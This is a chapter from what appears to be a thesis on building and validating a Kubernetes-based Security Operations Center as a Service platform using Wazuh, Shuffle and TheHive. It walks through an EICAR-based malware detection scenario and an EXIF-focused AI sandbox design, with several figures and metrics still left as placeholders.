# Chapter 4 - Implementation and Validation Testing of the SOCaaS Platform

## 4.1 Introduction

This chapter presents the practical implementation and validation testing of SOCaaS, a Security Operations Center as a Service platform designed for small and medium-sized enterprises and institutions. The objective of this chapter is to demonstrate how the proposed architecture was deployed, integrated, and validated through controlled cybersecurity scenarios. The implementation combines a Kubernetes-based infrastructure, open-source security components, an automated detection and response pipeline, case management, notification delivery, and AI-assisted analyst support.

SOCaaS was implemented as a cloud-native SOC stack composed of Wazuh for security monitoring and event correlation, Shuffle for SOAR orchestration, TheHive for incident response and case management, and a custom Pipeline Gateway for alert ingestion, enrichment, deduplication, and routing. The platform also integrates VirusTotal for IOC enrichment, Telegram and email for analyst notification, an AI recommendation layer for contextual response guidance, and an AI Sandbox concept for suspicious sample analysis.

The validation work focuses on the operational behavior of the deployed platform rather than on theoretical architecture alone. The chapter therefore describes the implemented infrastructure, the deployed Kubernetes workloads, the SIEM/SOAR/case-management integrations, the alert forwarding mechanism, and the end-to-end detection pipeline. The primary validation case is a malware-oriented SOC detection and response scenario on the Windows victim endpoint. A second validation case evaluates the AI Sandbox feature using EXIF-based suspicious file metadata analysis. Additional Nmap port scanning and Command and Control detection scenarios are documented in annexes because they support the validation effort but are secondary to the main malware and sandbox case studies.

## 4.2 SOCaaS Infrastructure Architecture

The SOCaaS laboratory was deployed on a virtualized environment using KVM/QEMU with libvirt. The host operating system was Parrot OS, and the virtual machines were connected through the `virbr0` bridge using the `192.168.122.0/24` subnet. This configuration made it possible to reproduce a realistic internal network while keeping the deployment isolated from production systems. The host also provided HAProxy as a TCP load balancer for selected external access points, including the Kubernetes API, Wazuh agent communication ports, and NodePort ranges used by the SOCaaS services.

The storage backend for the project was located under `/srv/socaas`, which hosted the project artifacts, deployment files, simulation files, and operational data required by the laboratory. The infrastructure contained five virtual machines: three Kubernetes nodes and two monitored victim endpoints. The control-plane node hosted the Kubernetes control functions, while the two worker nodes were separated according to workload type. The first worker node hosted the SIEM-oriented workloads, mainly Wazuh. The second worker node hosted the SOAR and incident response workloads, including Shuffle, TheHive, the Pipeline Gateway, and their supporting databases or caches.

The two victim endpoints were included to validate monitoring from both Linux and Windows environments. The Linux victim endpoint was used mainly for network and firewall-based detection scenarios, while the Windows victim endpoint was used for malware, Windows Event Log, Sysmon-style, and file integrity monitoring scenarios.

| VM | IP Address | vCPUs | RAM | Disk | Role |
|---|---:|---:|---:|---:|---|
| `k8s-master` | `192.168.122.10` | 2 | 4 GB | 50 GB | Kubernetes control plane |
| `k8s-worker1` | `192.168.122.11` | 4 | 8 GB | 120 GB | SIEM workloads, mainly Wazuh |
| `k8s-worker2` | `192.168.122.12` | 4 | 8 GB | 120 GB | SOAR, TheHive, and pipeline workloads |
| `victim-01` | `192.168.122.180` | 1 | 512 MB | 5 GB | Linux victim endpoint |
| `win10-vicitm` | `192.168.122.98` | 2 | 4 GB | 60 GB | Windows victim endpoint |

> **Figure 4.1 - SOCaaS Lab Infrastructure Architecture**  
> [Insert figure here: diagram showing the host, virbr0 network, Kubernetes VMs, victim machines, HAProxy, and external access points.]

## 4.3 Kubernetes Cluster Deployment

The SOCaaS platform was deployed on Kubernetes version `v1.28.15`. Kubernetes was selected because it provides declarative deployment, workload isolation through namespaces, service discovery, persistent volume management, restart policies, and a reproducible deployment model. These properties are important for a SOCaaS platform because the SOC stack includes stateful components, web interfaces, background workers, and API-based integrations that must remain available during validation.

The cluster used Calico `v3.28.5` as the Container Network Interface. Calico provided pod networking and a foundation for future network policy enforcement. The container runtime was containerd `2.2.1`. The pod network was configured with the `10.244.0.0/16` CIDR, while Kubernetes services used the `10.96.0.0/12` CIDR. CoreDNS was available at `10.96.0.10` and was required for internal service discovery between components such as Shuffle, TheHive, the Pipeline Gateway, and their supporting services. Helm was used as the package manager to organize and deploy SOCaaS components through reusable Kubernetes manifests and chart logic.

The namespace design separated the platform into functional domains. This separation improved operational clarity and reduced the risk of configuration conflicts between the SIEM, SOAR, and incident response components. The `socaas-system` namespace was reserved for release state and deployment management. The `socaas-siem` namespace hosted Wazuh workloads. The `socaas-soar` namespace hosted Shuffle, Redis, OpenSearch, and the Pipeline Gateway. The `socaas-thehive` namespace hosted TheHive and its dependencies.

| Namespace | Purpose | Main Workloads | Preferred Node Placement |
|---|---|---|---|
| `socaas-system` | SOCaaS release and platform management | Helm release state | `k8s-master` |
| `socaas-siem` | Security monitoring and event correlation | Wazuh Manager, Wazuh Indexer, Wazuh Dashboard | `k8s-worker1` |
| `socaas-soar` | Security orchestration and automation | Shuffle Backend, Frontend, Orborus, OpenSearch, Redis, Pipeline Gateway | `k8s-worker2` |
| `socaas-thehive` | Incident response and case management | TheHive, Cassandra, Elasticsearch, MinIO | `k8s-worker2` |

The workload placement was designed to avoid unnecessary resource contention. Wazuh is log-ingestion and correlation intensive, especially when endpoint agents generate bursts of events. It was therefore placed on `k8s-worker1`. Shuffle, TheHive, Cassandra, Elasticsearch, MinIO, Redis, and the Pipeline Gateway were placed on `k8s-worker2`, where SOAR execution, case creation, and enrichment processing could be handled separately from SIEM correlation. This distribution also reflects a practical SOCaaS deployment pattern in which collection and correlation workloads are separated from orchestration and incident response workloads.

> **Figure 4.2 - Kubernetes Cluster Nodes**  
> [Insert figure here: kubectl get nodes output showing the master and worker nodes.]

> **Figure 4.3 - Kubernetes Namespace Distribution**  
> [Insert figure here: kubectl get pods -A or namespace/workload distribution screenshot.]

## 4.4 Deployment of SOCaaS Security Components

The SOCaaS security stack was deployed as a set of Kubernetes workloads and services. The implemented components correspond to the main SOC functions: detection, alert enrichment, automated triage, incident case management, notification, and analyst support. Each component was integrated through HTTP APIs, Kubernetes services, NodePort exposure where required, and explicit authentication headers or API tokens. Sensitive credentials are not included in this chapter and must be rotated before any production deployment.

### 4.4.1 Deployment of Wazuh SIEM

Wazuh was deployed as the SIEM component of the SOCaaS platform. The deployed Wazuh version was `4.8.2` for the Wazuh Manager, Wazuh Indexer, Wazuh Dashboard, and endpoint agents. The Wazuh Manager provided alert correlation, rule processing, agent management, log collection, and alert generation. The Wazuh Indexer stored alerts and indexed event data. The Wazuh Dashboard provided the analyst interface for visualization and security event investigation.

Two Wazuh agents were used for endpoint monitoring. The Linux agent monitored `victim-01`, while the Windows agent monitored `win10-vicitm`. The Linux endpoint was configured to support firewall log monitoring through UFW-related logs. The Windows endpoint was configured for Windows Event Log monitoring, malware detection events, and file integrity monitoring. This combination made it possible to validate SOCaaS using both host-based and network-related telemetry.

The Wazuh rule engine was central to the detection logic. For firewall and scan detection, Rule `4000` and Rule `4100` were configured to detect UFW firewall block events and port scan behavior. Additional custom rules `100001` to `100003` supported UFW scan grouping. Rule `554` was used for file integrity monitoring and malware-related file creation or modification detection. Rule `60602` was used for Windows Defender malware detection. A custom kernel UFW `BLOCK` decoder extracted fields such as source IP, destination IP, destination port, and protocol from kernel logs.

The implementation required attention to Wazuh rule ordering. Default Wazuh rules are loaded before local rules, and local rules do not automatically override default behavior unless explicitly configured. This was relevant for UFW detection because the default Rule `4100` behavior required adjustment to produce actionable level-based alerts for the SOC pipeline. On the Windows endpoint, absolute monitored paths were preferred for File Integrity Monitoring because environment variables may expand differently under the Windows service account used by the Wazuh agent.

> **Figure 4.4 - Wazuh Components Deployed on Kubernetes**  
> [Insert figure here: Wazuh pods, services, or architecture.]

> **Figure 4.5 - Wazuh Dashboard**  
> [Insert figure here: Wazuh dashboard showing alerts or security events.]

### 4.4.2 Deployment of Shuffle SOAR

Shuffle was deployed as the SOAR platform used to orchestrate alert triage and automated response steps. The deployed Shuffle components were Shuffle Backend `1.4.0`, Shuffle Frontend `1.4.0`, Shuffle Orborus `1.4.0`, Shuffle OpenSearch, and Redis. The backend provided the API and workflow engine, the frontend provided the graphical user interface, Orborus executed workflow actions, OpenSearch stored workflow and application data, and Redis supported session and queue-related functions.

Shuffle was responsible for receiving alerts from the Pipeline Gateway, normalizing SOC alert fields, selecting the correct VirusTotal target, performing IOC enrichment, generating AI-based recommended analyst actions, sending analyst notifications, and creating TheHive cases. The workflow used several Shuffle applications, including Webhook, Shuffle Tools with Python execution, Telegram Bot, HTTP, VirusTotal v3, and Mailtrap/email.

The Webhook application acted as the external trigger for the SOCaaS workflow. Shuffle Tools were used to execute Python logic for normalization, target selection, context building, and final response handling. The VirusTotal v3 application performed IOC enrichment. The Telegram Bot application delivered concise operational alerts to analysts, while email delivered more complete context. HTTP actions were used to interact with TheHive and other APIs where direct application support was not sufficient.

> **Figure 4.6 - Shuffle SOAR Components**  
> [Insert figure here: Shuffle pods or Kubernetes resources.]

> **Figure 4.7 - SOCaaS Shuffle Workflow Overview**  
> [Insert figure here: full Shuffle workflow screenshot.]

### 4.4.3 Deployment of TheHive Case Management Platform

TheHive was deployed as the incident response and case management platform. The deployed version was TheHive `5.3.11-1`, supported by Cassandra, Elasticsearch, and MinIO. Cassandra provided the main database backend, Elasticsearch supported indexing and search operations, and MinIO provided object storage for file attachments and artifacts.

The TheHive organization structure was configured with a clear separation between platform administration and SOC operations. The built-in `admin` organization was reserved for platform administration. The custom `socaas` organization was used for operational SOC work, including cases, alerts, tasks, observables, and analyst-facing incident records. The integration user was `socaas-shuffle@thehive.local`, and API calls from the Pipeline Gateway and Shuffle required the following organization header:

```http
X-Organisation: socaas
```

This header was necessary because TheHive 5.x requires operational objects to be created inside a non-admin organization. Without the correct organization header, API calls may fail even when the API key belongs to a user with appropriate organization-level permissions.

TheHive received alerts and cases from two integration paths. The Pipeline Gateway created TheHive alerts directly after validating and deduplicating Wazuh alerts. Shuffle also created incident cases after normalization, enrichment, AI recommendation generation, and notification preparation. This dual design allowed SOCaaS to preserve raw alert context while also producing analyst-ready case records.

> **Figure 4.8 - TheHive Deployment on Kubernetes**  
> [Insert figure here: TheHive, Cassandra, Elasticsearch, and MinIO pods.]

> **Figure 4.9 - TheHive SOCaaS Organization and Case Interface**  
> [Insert figure here: TheHive UI showing alerts or cases.]

### 4.4.4 Pipeline Gateway and Wazuh Alert Forwarder

The Pipeline Gateway was implemented as a lightweight Python service using Python `3.12` and the standard `http.server` module. It ran internally on port `8080` and was exposed externally through Kubernetes NodePort `30001`. Its Wazuh ingestion endpoint was:

```text
/hooks/wazuh
```

The gateway validated incoming requests using a shared secret provided through the `X-SOCaaS-Webhook-Secret` header. This mechanism prevented unauthenticated systems from injecting arbitrary alerts into the SOC workflow. The secret itself is not documented in the thesis and must be rotated before production deployment.

After request validation, the Pipeline Gateway extracted observables from Wazuh alerts, including IP addresses, domains, URLs, hashes, file paths, and process context where available. It performed VirusTotal enrichment where appropriate, created alerts in TheHive, and forwarded unique alerts to the Shuffle webhook. A 300-second in-memory TTL deduplication cache was implemented to reduce alert flooding. The deduplication key grouped alerts by agent name, agent IP, source IP, and rule ID. This was particularly important for scan events, where a single Nmap run can generate hundreds of firewall block events.

The Wazuh Alert Forwarder was implemented as a Python sidecar running inside the Wazuh Manager pod. Its function was to read `/var/ossec/logs/alerts/alerts.json` in real time and send each Wazuh alert to the Pipeline Gateway through `POST /hooks/wazuh`. This sidecar design avoided requiring invasive changes to Wazuh itself and provided a controlled integration point between SIEM alert generation and SOAR processing.

> **Figure 4.10 - SOCaaS Pipeline Gateway Architecture**  
> [Insert figure here: data flow from Wazuh alerts.json to forwarder, gateway, Shuffle, and TheHive.]

> **Figure 4.11 - Pipeline Gateway Health Check and Webhook Endpoint**  
> [Insert figure here: terminal output showing /healthz or webhook test.]

## 4.5 End-to-End Detection and Response Pipeline

The SOCaaS detection and response pipeline connects endpoint telemetry to analyst-facing incident management. The pipeline begins when an attack or suspicious action occurs against the Linux or Windows victim endpoint. The event generates telemetry through UFW, Windows Firewall, File Integrity Monitoring, Windows Event Logs, or Sysmon-style network events. The Wazuh agent forwards the telemetry to the Wazuh Manager, where the rule engine correlates the event and generates an alert.

Once the alert is written to `alerts.json`, the Wazuh Alert Forwarder reads it and sends it to the Pipeline Gateway. The gateway validates the request, extracts observables, applies deduplication, enriches relevant indicators, creates a TheHive alert, and forwards unique events to the Shuffle webhook. Shuffle then executes the SOCaaS Wazuh Alert Triage workflow. This workflow normalizes the alert, selects the appropriate VirusTotal target, performs enrichment, generates AI-based analyst recommendations, sends concise Telegram and detailed email notifications, and creates a structured TheHive case.

The complete detection flow is summarized as follows:

1. An attack or suspicious action is executed against the Linux or Windows victim endpoint.
2. Endpoint telemetry is generated by UFW, Windows Firewall, File Integrity Monitoring, or Event Logs.
3. The Wazuh agent forwards the telemetry to the Wazuh Manager.
4. The Wazuh Manager applies detection and correlation rules.
5. The Wazuh Alert Forwarder reads the generated alert from `alerts.json`.
6. The Pipeline Gateway receives the alert through `/hooks/wazuh`.
7. The Pipeline Gateway extracts observables and applies the 300-second deduplication cache.
8. The Pipeline Gateway forwards unique alerts to Shuffle and creates a TheHive alert.
9. Shuffle performs enrichment, AI recommendation generation, notification, and case creation.
10. TheHive stores the incident case with context, observables, severity, and timeline data.

```text
Attacker / Simulation
        |
        v
Linux or Windows Victim Endpoint
        |
        v
UFW / Windows Firewall / FIM / Event Logs
        |
        v
Wazuh Agent
        |
        v
Wazuh Manager and Rule Engine
        |
        v
alerts.json
        |
        v
Wazuh Alert Forwarder
        |
        v
Pipeline Gateway
   |          |
   |          +--> TheHive Alert API
   |
   +--> Shuffle Webhook
             |
             v
Normalize, Enrich, Recommend, Notify, Create Case
             |
             v
TheHive Case, Telegram Alert, Email Notification
```

> **Figure 4.12 - End-to-End SOCaaS Detection Pipeline**  
> [Insert figure here: diagram showing attacker, victim endpoint, Wazuh agent, Wazuh manager, alert forwarder, pipeline gateway, Shuffle, TheHive, Telegram, and email.]

## 4.6 SOAR Workflow Implementation

The implemented Shuffle workflow was initially named `khalil` in the project environment. For academic presentation, it is referred to as the SOCaaS Wazuh Alert Triage Workflow. Its purpose is to transform a raw Wazuh alert into a structured incident response object that can be enriched, communicated to analysts, and stored in TheHive.

The workflow contained the following actions:

| Order | Action | Purpose |
|---:|---|---|
| 1 | `Webhook_1` | Receives the alert forwarded by the Pipeline Gateway. |
| 2 | `Normalize_SOC_Alert` | Parses the Wazuh alert and extracts a consistent SOC alert model. |
| 3 | `Build_VirusTotal_Target` | Selects the correct IOC and VirusTotal endpoint based on alert type. |
| 4 | `Virustotal_v3` | Performs IOC enrichment using VirusTotal v3. |
| 5 | `Generate_AI_Recommended_Actions` | Generates contextual analyst recommendations from normalized fields. |
| 6 | `Build_Context_TheHive_Email_Body` | Builds the detailed context used by email and TheHive. |
| 7 | `Send_Telegram_Notification` | Sends a concise alert notification to analysts. |
| 8 | `Send_Email_Notification` | Sends a detailed email notification with investigation context. |
| 9 | `Create_TheHive_Case` | Creates a structured incident case in TheHive. |
| 10 | `Final_Response` | Returns workflow completion status and summary information. |

The `Webhook_1` action is the entry point for the workflow. It receives the alert already validated and deduplicated by the Pipeline Gateway. The `Normalize_SOC_Alert` action converts heterogeneous Wazuh JSON fields into a normalized schema containing the rule ID, severity, agent identity, source and destination context, file information, process information, user identity, MITRE ATT&CK mapping, and candidate observables.

The `Build_VirusTotal_Target` action was added to avoid incorrect enrichment behavior. Early enrichment logic queried only source IP addresses, which was insufficient for malware alerts that require file hash lookup, C2 alerts that may contain domains or URLs, and lab alerts that contain private IP addresses. The redesigned logic selects the most appropriate target: file hash for malware, domain or URL for C2, public IP for scan or network events, and a safe no-op query when no public IOC is available.

Private IP ranges are filtered before VirusTotal lookup:

```text
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
169.254.0.0/16
```

This filtering is necessary in the laboratory environment because most endpoint and infrastructure IP addresses are private, including `192.168.122.98`, `192.168.122.180`, and `192.168.122.1`. VirusTotal cannot provide meaningful maliciousness scoring for these private addresses, and treating a skipped private-IP lookup as suspicious would create misleading analyst context.

The `Generate_AI_Recommended_Actions` action receives normalized alert data and produces structured response recommendations. The AI output is not used as a deterministic control decision; it is used only to support analyst triage. The `Build_Context_TheHive_Email_Body` action combines deterministic alert details, VirusTotal results, and AI recommendations into a detailed body suitable for email and TheHive. Telegram remains intentionally concise to avoid unreadable long messages in a chat channel. The workflow ends by creating the TheHive case and returning a final status.

> **Figure 4.13 - Shuffle Alert Normalization Node**  
> [Insert figure here: Normalize_SOC_Alert output.]

> **Figure 4.14 - VirusTotal Target Selection Logic**  
> [Insert figure here: Build_VirusTotal_Target node output.]

> **Figure 4.15 - Telegram and Email Notification Output**  
> [Insert figure here: Telegram/email notifications generated by Shuffle.]

## 4.7 AI-Assisted Alert Analysis

The SOCaaS AI layer was implemented to assist analysts, not to replace deterministic security controls. The platform still relies on Wazuh rules, Pipeline Gateway validation, explicit deduplication logic, and structured SOAR workflow actions for operational decisions. The AI layer provides contextual recommendations that help analysts understand the alert, prioritize evidence collection, and select appropriate response actions.

The design principles applied to AI-assisted alert analysis were the following:

| Principle | Implementation in SOCaaS |
|---|---|
| AI assists, automation controls | Python and Shuffle nodes normalize, validate, and route alerts; AI generates guidance only. |
| Telegram stays concise | Telegram messages contain short operational summaries, not long investigation reports. |
| TheHive and email contain full context | Detailed recommendations and evidence are stored in TheHive and email notifications. |
| AI must not invent observables | Prompts explicitly prevent invented IPs, hashes, domains, users, process names, or URLs. |
| Alert-type-aware recommendations | Different guidance is generated for scan, malware, C2, authentication, web attack, Windows event, network, exfiltration, and generic alerts. |
| Fail-safe fallback templates | If AI generation fails, deterministic templates still produce notifications and cases. |

The `Generate_AI_Recommended_Actions` node receives normalized alert context and returns a structured `alert_type` along with five to seven recommended analyst actions. The supported alert types include `scan`, `malware`, `c2`, `auth`, `web_attack`, `windows_event`, `network`, `exfiltration`, and `generic`. For malware alerts, the recommendations focus on hash validation, host isolation, file quarantine, evidence collection, persistence checks, and sandbox submission. For C2 alerts, they focus on destination validation, process tree analysis, DNS and proxy log review, beaconing confirmation, isolation, and containment. For scan alerts, they focus on source authorization, exposed service validation, firewall logs, and blocking decisions.

The AI prompt includes explicit guardrails:

```text
- Return valid JSON only.
- Do not invent missing observables.
- Do not label process names as domains.
- Do not label EventChannel as a network observable.
- If VirusTotal lookup is skipped, do not treat it as suspicious.
- If VirusTotal returns NotFoundError, say the IOC was not found, not malicious.
- Telegram is built by Python templates; AI writes recommendations.
```

These guardrails reduce common AI errors observed during workflow design, such as interpreting a process name as a domain, treating a skipped VirusTotal lookup as evidence of maliciousness, or inventing missing values. The resulting approach preserves deterministic control while still using AI to improve case readability and analyst response quality.

> **Figure 4.16 - AI-Generated Recommended Analyst Actions**  
> [Insert figure here: output of the AI recommendation node.]

## 4.8 Validation Scenario 1: Malware Case Study for SOC Detection and Response

The main validation scenario evaluates the SOCaaS detection and response chain using a malware-oriented case on the Windows victim endpoint `win10-vicitm` with IP address `192.168.122.98`. The scenario is based on a malware dropper simulation that creates suspicious executable activity under the user profile. The simulated behavior includes an EICAR test file and meterpreter-like payload characteristics. The objective is not to execute destructive malware, but to validate the SOC workflow from endpoint telemetry to detection, enrichment, notification, AI recommendation, case creation, and sandbox readiness.

The suspicious file path used in the scenario was:

```text
C:\Users\win10-victim\AppData\Roaming\MicrosoftEdge\update_helper.exe
```

The EICAR SHA256 used for validation was:

```text
275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f
```

The expected SOCaaS behavior was that Wazuh would generate a File Integrity Monitoring alert using Rule `554`, the Pipeline Gateway would forward the deduplicated event, Shuffle would classify it as `malware`, VirusTotal would perform a file hash lookup, Telegram and email notifications would be generated, TheHive would receive a case, AI recommendations would be added to the analyst context, and the sandbox trigger logic would identify the event as ready for future automated analysis.

### 4.8.1 Initial Access and Execution

The scenario corresponds to user-driven execution of a suspicious file and simulated malware staging. In MITRE ATT&CK terms, the execution aspect maps to `T1204 - User Execution`. Because the scenario includes transfer or staging of a payload, `T1105 - Ingress Tool Transfer` is also relevant when the suspicious executable is retrieved or placed on the endpoint before execution.

The Windows victim endpoint receives or contains the simulated dropper, which places the suspicious executable in the `AppData\Roaming\MicrosoftEdge` path. The file name `update_helper.exe` was intentionally selected to resemble a legitimate software updater. This naming pattern is common in malware simulations because it reflects how adversaries attempt to blend malicious files into user profile or application directories.

> **Figure 4.17 - Malware Sample Execution on Windows Victim**  
> [Insert figure here: Windows victim showing sample location or execution.]

### 4.8.2 Detection by Wazuh

Wazuh detected the scenario through File Integrity Monitoring. The monitored path included the location where the suspicious executable was created. When the file appeared or changed, the Wazuh agent generated telemetry and forwarded it to the Wazuh Manager. The Wazuh Manager applied Rule `554`, which was used in this project for FIM-based malware detection.

The alert contained file-related evidence, including the file name, full path, hash, process context, user context where available, and the agent identity. This information was essential for downstream processing because the Shuffle workflow required the file hash for VirusTotal lookup and the file path for analyst investigation. The alert was then written to `/var/ossec/logs/alerts/alerts.json`, where it became available to the Wazuh Alert Forwarder.

> **Figure 4.18 - Wazuh Malware Detection Alert**  
> [Insert figure here: Wazuh alert showing Rule 554 and the file path/hash.]

### 4.8.3 Enrichment and SOAR Processing

After detection, the Wazuh Alert Forwarder sent the alert to the Pipeline Gateway. The gateway validated the shared secret header, extracted observables, and forwarded the unique event to Shuffle. In the SOAR workflow, `Normalize_SOC_Alert` classified the event context and extracted the file hash. `Build_VirusTotal_Target` selected the file hash as the preferred VirusTotal target because the alert type was malware.

This behavior was important because malware alerts should not rely on private endpoint IP addresses for enrichment. In this case, the useful IOC was the SHA256 hash of the suspicious file. The VirusTotal v3 action therefore used file hash lookup rather than IP address lookup. The AI recommendation node then received the normalized alert and enrichment context and generated analyst actions focused on malware triage, containment, evidence collection, persistence checks, and sandbox analysis.

> **Figure 4.19 - VirusTotal File Hash Enrichment in Shuffle**  
> [Insert figure here: VirusTotal v3 output for the malware hash.]

### 4.8.4 TheHive Case Creation

TheHive case creation validated the incident response component of SOCaaS. The case contained the malware classification, severity, endpoint identity, rule ID, file path, hash, process context, and enrichment results. The case also preserved the AI-generated recommendations and provided an operational record for analyst follow-up.

The case severity was derived from the Wazuh rule severity and SOCaaS classification logic. The file hash was included as an observable so that analysts could pivot to external intelligence, compare with endpoint evidence, or submit the sample to the sandbox. The TheHive case represented the authoritative incident record for the validation scenario.

> **Figure 4.20 - TheHive Malware Case**  
> [Insert figure here: TheHive case created for the malware event.]

### 4.8.5 Notification and Analyst Context

The SOCaaS workflow sent notifications through Telegram and email. Telegram was used for immediate analyst awareness and included a concise summary of the malware alert, severity, affected endpoint, and core IOC. Email contained richer investigation context, including the normalized alert fields, VirusTotal result summary, and AI-generated recommended actions.

This split between concise and detailed communication was intentional. In operational SOC environments, chat notifications must remain readable and actionable, while case management systems and email reports can contain complete technical context. The same detailed context was also preserved in TheHive to support later investigation, documentation, and reporting.

> **Figure 4.21 - Malware Alert Notification Sent to Analyst**  
> [Insert figure here: Telegram or email alert.]

### 4.8.6 Response and Containment

The recommended response actions for the malware scenario included isolating the affected Windows victim endpoint, validating the SHA256 hash, collecting evidence from the file path and related process tree, removing or quarantining the suspicious file, investigating persistence mechanisms, and documenting all findings in TheHive. Because the file was located in a user profile path and used a software-updater-like name, the analyst should also review startup entries, scheduled tasks, registry run keys, and recent user execution history.

The scenario also validated sandbox trigger readiness. The workflow could identify that the alert type was malware, a file hash was available, and a file path or file name existed. These conditions are sufficient for building a sandbox request once the sample acquisition mechanism is connected to the orchestrator. The final workflow execution therefore demonstrated that SOCaaS can support an incident lifecycle from detection to triage and prepared sample analysis.

> **Figure 4.22 - Malware Response Workflow Completion**  
> [Insert figure here: Shuffle workflow finished successfully.]

## 4.9 Validation Scenario 2: AI Sandbox Feature with EXIF-Based Sample Analysis

The second validation scenario focuses on the AI Sandbox feature. In the full SOCaaS design, the sandbox receives malware or suspicious samples from SOC alerts, creates a disposable isolated analysis environment, performs static and dynamic analysis when appropriate, and generates a structured report that can be attached to the related TheHive case.

For this chapter, the sandbox validation case is based on EXIF metadata analysis of a suspicious file, document, or image. This case is appropriate for validating the sandbox reporting concept because many security investigations involve files whose metadata may reveal authorship, software origin, creation timestamps, modification history, device identifiers, or GPS data. The goal is to demonstrate that the AI Sandbox can extract structured artifacts and convert them into a readable investigation report without claiming unavailable behavioral results.

### 4.9.1 Sandbox Objective and Security Model

The AI Sandbox objective is to provide first-level automated sample analysis while preserving isolation between suspicious files and the SOCaaS infrastructure. The main security rule is that an infected or used sandbox environment must never be reused. The intended lifecycle is:

```text
golden image -> temporary linked clone -> analyze sample -> collect artifacts -> destroy VM -> delete disk
```

The golden image is a clean template maintained only for updates and tooling. For each analysis request, the orchestrator creates a temporary linked clone, injects the sample through a controlled mechanism, runs the required analysis tools, collects artifacts, generates the report, and then destroys the VM and deletes its disk. The sandbox network is isolated from the SOC network and can use a fake internet or collector service when behavioral network observation is required. The sandbox must not have direct access to the Kubernetes cluster, TheHive, Wazuh, Shuffle, or the host LAN.

This model reduces cross-contamination between analyses and limits the blast radius of malicious samples. It also supports defensible forensic practice because each run has a separate identifier, separate disk state, and separate artifact directory.

> **Figure 4.23 - AI Sandbox Architecture**  
> [Insert figure here: architecture showing Shuffle, Sandbox Orchestrator, temporary VM, fake internet collector, report generation, and TheHive.]

### 4.9.2 EXIF Sample Submission

In the EXIF validation case, the suspicious sample can be submitted from the SOC workflow or manually attached to the related TheHive case. In a complete SOCaaS workflow, a malware or suspicious-file alert would create a case, then a Shuffle action would build a sandbox request containing the case identifier, sample metadata, hash, and requested analysis profile. For EXIF validation, the analysis profile is metadata-focused and does not require execution of the sample.

Manual submission remains useful for analyst-driven investigations. An analyst may attach a suspicious image or document to TheHive, request sandbox analysis, and receive a structured report. This design supports both automated alert-driven analysis and human-initiated sample review.

> **Figure 4.24 - EXIF Sample Submitted to the AI Sandbox**  
> [Insert figure here: sandbox request or TheHive observable/file attachment.]

### 4.9.3 Static Metadata Extraction

The EXIF analysis workflow performs static metadata extraction. The sandbox calculates file hashes, identifies the file type, extracts EXIF metadata where available, and reviews fields such as author, software, creation timestamp, modification timestamp, embedded GPS data, device model, and metadata consistency. Static analysis is sufficient for this case because the objective is to evaluate file metadata and AI report generation, not to execute a malware payload.

The following fields should be replaced with the measured values from the actual EXIF sample:

| Field | Value |
|---|---|
| File name | [insert file name] |
| SHA256 | [insert hash] |
| MIME type | [insert type] |
| EXIF Software | [insert value] |
| Creation time | [insert value] |
| Modification time | [insert value] |
| GPS metadata | [insert value or “not present”] |
| Suspicious indicators | [insert indicators] |

Suspicious metadata indicators may include inconsistent creation and modification times, unexpected editing software, embedded GPS data that should not be present, author fields inconsistent with the claimed source, or evidence that the file was modified shortly before delivery. The sandbox should preserve raw metadata in the appendix while presenting analyst-readable conclusions in the main report.

> **Figure 4.25 - EXIF Metadata Extraction Results**  
> [Insert figure here: ExifTool or sandbox output showing extracted metadata.]

### 4.9.4 AI-Generated Sandbox Report

After metadata extraction, the AI model receives sanitized artifacts rather than the raw suspicious file. This distinction is important: the AI is used to summarize evidence, not to execute or directly inspect a potentially malicious sample. The report generated by the AI Sandbox should include the following sections:

1. Executive Summary.
2. Sample Information.
3. Static Analysis Findings.
4. Metadata Findings.
5. Suspicious Indicators.
6. MITRE ATT&CK Mapping if applicable.
7. Risk Rating.
8. Recommended Analyst Actions.
9. Appendix with raw artifacts.

For the EXIF case, the MITRE ATT&CK mapping may be limited or marked as not directly applicable unless the metadata supports a specific adversary behavior. The risk rating should be based on extracted evidence and must not claim maliciousness without supporting indicators. Recommended actions may include validating the source of the file, checking whether GPS or author metadata violates policy, comparing timestamps with delivery records, searching for the hash in threat intelligence sources, and attaching the report to the case.

> **Figure 4.26 - AI Sandbox Report for EXIF Analysis**  
> [Insert figure here: generated Markdown/PDF sandbox report.]

### 4.9.5 TheHive Case Update

The sandbox result is added to TheHive so that the analysis becomes part of the incident record. The initial implementation can add the report as a case comment, while later versions may upload a Markdown or PDF attachment and add extracted observables. Tags should be applied to make sandbox status searchable and visible to analysts.

The expected TheHive update includes:

```text
comment
attachment
observables
tags: ai-sandbox, sandbox-completed, sandbox-risk-[level]
```

The tag `sandbox-risk-[level]` should be replaced by a concrete risk value such as `sandbox-risk-low`, `sandbox-risk-medium`, or `sandbox-risk-high` after the actual sample is analyzed. If analysis fails, the workflow should use a failure tag and preserve the error message without blocking the original SOC notification or case creation.

> **Figure 4.27 - TheHive Case Updated with AI Sandbox Report**  
> [Insert figure here: TheHive case comment or attachment showing sandbox report.]

## 4.10 Evaluation of Results

The evaluation of SOCaaS used both implemented measurements and placeholders for values that require final screenshot-based timing evidence. The platform-level metrics confirm that the environment was large enough to exercise a realistic SOC pipeline while remaining feasible for a laboratory deployment. The operational metrics evaluate detection latency, SOAR processing, case creation, notification reliability, deduplication, IOC enrichment, AI recommendation quality, and sandbox behavior.

| Metric | Measurement Method | Expected/Observed Result | Interpretation |
|---|---|---|---|
| Mean Time to Detect (MTTD) | Difference between attack or simulation timestamp and Wazuh alert timestamp | [insert measured value] | Measures how quickly endpoint telemetry becomes a SIEM alert. |
| Mean Time to Respond (MTTR) | Difference between Wazuh alert timestamp and analyst-ready case/notification completion | [insert measured value] | Measures practical response readiness after detection. |
| SOAR latency | Shuffle workflow start time compared with workflow completion time | [insert measured value] | Evaluates automation execution time and workflow overhead. |
| TheHive case creation time | Wazuh alert timestamp compared with TheHive case creation timestamp | [insert measured value] | Confirms whether case management receives alerts within an operationally useful delay. |
| Notification reliability | Telegram and email delivery success over validation runs | [insert measured value] | Confirms whether analysts receive operational alerts consistently. |
| Deduplication effectiveness | Raw Wazuh alerts compared with forwarded Shuffle executions | 200-port Nmap scan reduced to approximately 1 forwarded alert | Demonstrates that alert flooding is controlled for repeated scan events. |
| VirusTotal target selection accuracy | Review selected IOC type for malware, C2, scan, and private-IP events | [insert measured value] | Confirms that hashes, domains, URLs, and public IPs are selected correctly. |
